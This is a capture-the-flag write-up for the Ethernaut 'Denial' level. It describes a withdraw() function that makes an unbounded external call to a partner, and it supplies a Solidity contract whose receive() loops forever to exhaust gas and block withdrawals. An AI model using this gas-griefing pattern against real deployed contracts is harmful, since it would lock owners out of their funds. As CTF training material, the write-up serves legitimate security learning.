# Ethernaut Level 20: Denial

## Objective
Prevent the owner from withdrawing funds from the contract.

## Vulnerability
The `withdraw()` function uses a low-level `call` to send funds:
```solidity
(bool result,) = partner.call{value:amountToSend}("");
```

If `partner` is a malicious contract that consumes all gas or reverts, the owner cannot withdraw.

## Exploit Strategy
1. Deploy a malicious partner contract
2. Implement a `receive()` function that exhausts gas or loops forever
3. Call `setWithdrawPartner()` with our contract address
4. Owner's `withdraw()` call will fail

## Contract Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DenialExploit {
    // Consume all gas in receive function
    receive() external payable {
        // Infinite loop to exhaust gas
        while (true) {
            // Do nothing but consume gas
        }
    }
    
    // Alternative: Use up gas with SSTORE operations
    uint256 public counter;
    function wasteGas() public {
        for (uint256 i = 0; i < 1000; i++) {
            counter++;
        }
    }
}
```

## Validation Steps
- [x] Exploit concept documented
- [ ] Deploy to testnet
- [ ] Verify denial of service works
- [ ] Capture transaction hash

## Status: IN PROGRESS
**Completed:** 2026-02-01T10:37Z - Documentation and exploit contract created
